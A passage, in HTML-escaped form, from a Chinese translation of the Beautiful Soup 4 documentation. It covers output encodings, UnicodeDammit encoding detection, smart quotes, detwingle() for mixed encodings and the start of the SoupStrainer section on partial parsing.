class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = b&amp;apos;&amp;apos;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;meta content=&amp;quot;text/html; charset=ISO-Latin-1&amp;quot; http-equiv=&amp;quot;Content-type&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;p&amp;gt;Sacr\xe9 bleu!&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;&amp;apos;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(soup.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;meta content=&amp;quot;text/html; charset=utf-8&amp;quot; http-equiv=&amp;quot;Content-type&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    Sacré bleu!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意,输出文档中的&lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt;标签的编码设置已经修改成了与输出编码一致的UTF-8.&lt;/p&gt;
&lt;p&gt;如果不想用UTF-8编码输出,可以将编码方式传入 &lt;code&gt;prettify()&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.prettify(&amp;quot;latin-1&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;meta content=&amp;quot;text/html; charset=latin-1&amp;quot; http-equiv=&amp;quot;Content-type&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还可以调用 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象或任意节点的 &lt;code&gt;encode()&lt;/code&gt; 方法,就像Python的字符串调用 &lt;code&gt;encode()&lt;/code&gt; 方法一样:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.p.encode(&amp;quot;latin-1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;&amp;lt;p&amp;gt;Sacr\xe9 bleu!&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.p.encode(&amp;quot;utf-8&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;&amp;lt;p&amp;gt;Sacr\xc3\xa9 bleu!&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果文档中包含当前编码不支持的字符,那么这些字符将呗转换成一系列XML特殊字符引用,下面例子中包含了Unicode编码字符SNOWMAN:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = u&amp;quot;&amp;lt;b&amp;gt;\N&amp;#123;SNOWMAN&amp;#125;&amp;lt;/b&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;snowman_soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = snowman_soup.b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;SNOWMAN字符在UTF-8编码中可以正常显示(看上去像是☃),但有些编码不支持SNOWMAN字符,比如ISO-Latin-1或ASCII,那么在这些编码中SNOWMAN字符会被转换成“&amp;amp;#9731”:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(tag.encode(&amp;quot;utf-8&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;☃&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print tag.encode(&amp;quot;latin-1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;amp;#9731;&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print tag.encode(&amp;quot;ascii&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;amp;#9731;&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Unicode-dammit-靠&quot;&gt;&lt;a href=&quot;#Unicode-dammit-靠&quot; class=&quot;headerlink&quot; title=&quot;Unicode, dammit! (靠!)&quot;&gt;&lt;/a&gt;Unicode, dammit! (靠!)&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;#unicode-dammit&quot;&gt;编码自动检测&lt;/a&gt; 功能可以在Beautiful Soup以外使用,检测某段未知编码时,可以使用这个方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import UnicodeDammit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dammit = UnicodeDammit(&amp;quot;Sacr\xc3\xa9 bleu!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(dammit.unicode_markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Sacré bleu!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dammit.original_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;utf-8&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果Python中安装了 &lt;code&gt;chardet&lt;/code&gt; 或 &lt;code&gt;cchardet&lt;/code&gt; 那么编码检测功能的准确率将大大提高.输入的字符越多,检测结果越精确,如果事先猜测到一些可能编码,那么可以将猜测的编码作为参数,这样将优先检测这些编码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dammit = UnicodeDammit(&amp;quot;Sacr\xe9 bleu!&amp;quot;, [&amp;quot;latin-1&amp;quot;, &amp;quot;iso-8859-1&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(dammit.unicode_markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Sacré bleu!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dammit.original_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;latin-1&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;#unicode-dammit&quot;&gt;编码自动检测&lt;/a&gt; 功能中有2项功能是Beautiful Soup库中用不到的&lt;/p&gt;
&lt;h3 id=&quot;智能引号&quot;&gt;&lt;a href=&quot;#智能引号&quot; class=&quot;headerlink&quot; title=&quot;智能引号&quot;&gt;&lt;/a&gt;智能引号&lt;/h3&gt;&lt;p&gt;使用Unicode时,Beautiful Soup还会智能的把引号 [10] 转换成HTML或XML中的特殊字符:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = b&amp;quot;&amp;lt;p&amp;gt;I just \x93love\x94 Microsoft Word\x92s smart quotes&amp;lt;/p&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UnicodeDammit(markup, [&amp;quot;windows-1252&amp;quot;], smart_quotes_to=&amp;quot;html&amp;quot;).unicode_markup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;p&amp;gt;I just &amp;amp;ldquo;love&amp;amp;rdquo; Microsoft Word&amp;amp;rsquo;s smart quotes&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UnicodeDammit(markup, [&amp;quot;windows-1252&amp;quot;], smart_quotes_to=&amp;quot;xml&amp;quot;).unicode_markup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;p&amp;gt;I just &amp;amp;#x201C;love&amp;amp;#x201D; Microsoft Word&amp;amp;#x2019;s smart quotes&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以把引号转换为ASCII码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;UnicodeDammit(markup, [&amp;quot;windows-1252&amp;quot;], smart_quotes_to=&amp;quot;ascii&amp;quot;).unicode_markup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;p&amp;gt;I just &amp;quot;love&amp;quot; Microsoft Word\&amp;apos;s smart quotes&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;很有用的功能,但是Beautiful Soup没有使用这种方式.默认情况下,Beautiful Soup把引号转换成Unicode:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;UnicodeDammit(markup, [&amp;quot;windows-1252&amp;quot;]).unicode_markup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;p&amp;gt;I just \u201clove\u201d Microsoft Word\u2019s smart quotes&amp;lt;/p&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;矛盾的编码&quot;&gt;&lt;a href=&quot;#矛盾的编码&quot; class=&quot;headerlink&quot; title=&quot;矛盾的编码&quot;&gt;&lt;/a&gt;矛盾的编码&lt;/h3&gt;&lt;p&gt;有时文档的大部分都是用UTF-8,但同时还包含了Windows-1252编码的字符,就像微软的智能引号 [10] 一样.一些包含多个信息的来源网站容易出现这种情况. &lt;code&gt;UnicodeDammit.detwingle()&lt;/code&gt; 方法可以把这类文档转换成纯UTF-8编码格式,看个简单的例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;snowmen = (u&amp;quot;\N&amp;#123;SNOWMAN&amp;#125;&amp;quot; * 3)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;quote = (u&amp;quot;\N&amp;#123;LEFT DOUBLE QUOTATION MARK&amp;#125;I like snowmen!\N&amp;#123;RIGHT DOUBLE QUOTATION MARK&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;doc = snowmen.encode(&amp;quot;utf8&amp;quot;) + quote.encode(&amp;quot;windows_1252&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段文档很杂乱,snowmen是UTF-8编码,引号是Windows-1252编码,直接输出时不能同时显示snowmen和引号,因为它们编码不同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(doc)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ☃☃☃�I like snowmen!�&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(doc.decode(&amp;quot;windows-1252&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# â˜ƒâ˜ƒâ˜ƒ“I like snowmen!”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果对这段文档用UTF-8解码就会得到 &lt;code&gt;UnicodeDecodeError&lt;/code&gt; 异常,如果用Windows-1252解码就回得到一堆乱码.幸好, &lt;code&gt;UnicodeDammit.detwingle()&lt;/code&gt; 方法会吧这段字符串转换成UTF-8编码,允许我们同时显示出文档中的snowmen和引号:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;new_doc = UnicodeDammit.detwingle(doc)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(new_doc.decode(&amp;quot;utf8&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ☃☃☃“I like snowmen!”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;UnicodeDammit.detwingle()&lt;/code&gt; 方法只能解码包含在UTF-8编码中的Windows-1252编码内容,但这解决了最常见的一类问题.&lt;/p&gt;
&lt;p&gt;在创建 &lt;code&gt;BeautifulSoup&lt;/code&gt; 或 &lt;code&gt;UnicodeDammit&lt;/code&gt; 对象前一定要先对文档调用 &lt;code&gt;UnicodeDammit.detwingle()&lt;/code&gt; 确保文档的编码方式正确.如果尝试去解析一段包含Windows-1252编码的UTF-8文档,就会得到一堆乱码,比如: â˜ƒâ˜ƒâ˜ƒ“I like snowmen!”.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;UnicodeDammit.detwingle()&lt;/code&gt; 方法在Beautiful Soup 4.1.0版本中新增&lt;/p&gt;
&lt;h1 id=&quot;解析部分文档&quot;&gt;&lt;a href=&quot;#解析部分文档&quot; class=&quot;headerlink&quot; title=&quot;解析部分文档&quot;&gt;&lt;/a&gt;解析部分文档&lt;/h1&gt;&lt;p&gt;如果仅仅因为想要查找文档中的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签而将整片文档进行解析,实在是浪费内存和时间.最快的方法是从一开始就把&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签以外的东西都忽略掉. &lt;code&gt;SoupStrainer&lt;/code&gt; 类可以定义文档的某段内容,这样搜索文档时就不必先解析整篇文档,只会解析在 &lt;code&gt;SoupStrainer&lt;/code&gt; 中定义过的文档. 创建一个 &lt;code&gt;SoupStrainer&lt;/code&gt; 对象并作为 &lt;code&gt;parse_only&lt;/code&gt; 参数给 &lt;code&gt;BeautifulSoup&lt;/code&gt; 的构造方法即可.&lt;/p&gt;
&lt;h2 id=&quot;SoupStrainer&quot;&gt;&lt;a href=&quot;#SoupStrainer&quot; class=&quot;headerlink&quot; title=&quot;SoupStrainer&quot;&gt;&lt;/a&gt;SoupStrainer&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SoupStrainer&lt;/code&gt; 类接受与典型搜索方法相同的参数：&lt;a href=&quot;#id32&quot;&gt;name&lt;/a&gt; , &lt;a href=&quot;#css&quot;&gt;attrs&lt;/a&gt; , &lt;a href=&quot;#recursive&quot;&gt;recursive&lt;/a&gt; , &lt;a href=&quot;#text&quot;&gt;text&lt;/a&gt; , &lt;a href=&quot;#keyword&quot;&gt;**kwargs&lt;/a&gt; 。下面举例说明三种 &lt;code&gt;SoupStrainer&lt;/code&gt; 对象：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import SoupStrainer&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;only_a_tags = SoupStrainer(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;only_tags_with_id_link2 = SoupStrainer(id=&amp;quot;link2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def is_short_string(string):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return len(string) &amp;lt; 10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;only_short_strings = SoupStrainer(text=is_short_string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再拿“爱丽丝”文档来举例，来看看使用三种 &lt;code&gt;SoupStrainer&lt;/code&gt; 对象做参数会有什么不同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 